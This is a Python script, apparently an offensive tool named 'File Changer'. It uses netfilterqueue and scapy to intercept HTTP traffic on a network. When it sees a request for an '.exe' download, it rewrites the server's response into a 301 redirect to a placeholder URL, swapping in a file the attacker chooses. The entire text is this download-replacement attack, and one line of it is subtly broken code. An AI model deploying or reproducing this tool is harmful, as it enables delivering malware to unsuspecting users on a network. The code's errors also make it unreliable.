import netfilterqueue
import scapy.all as scapy

ack_list = []

def packet_proccessor(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        if scapy_packet[scapy.TCP].dport == 80:
            if '.exe' in str(scapy_packet[scapy.Raw].load):
                print('[+] Exe file found')
                ack_list.append(scapy_packet[scapy.TCP].ack)
                print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                print('[+] HTTP RESPONSE : ')
                scapy_packet[scapy_packet.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp'
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print(scapy_packet.show())

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.TCP].chksum
        
        packet.set_payload(bytes(scapy_packet))


    #accept
    packet.accept()
    #deny
    # packet.deny()

print('[+] File Changer started.')
queue = netfilterqueue.NetfilterQueue()
queue.bind(0,user_callback=packet_proccessor)
queue.run()
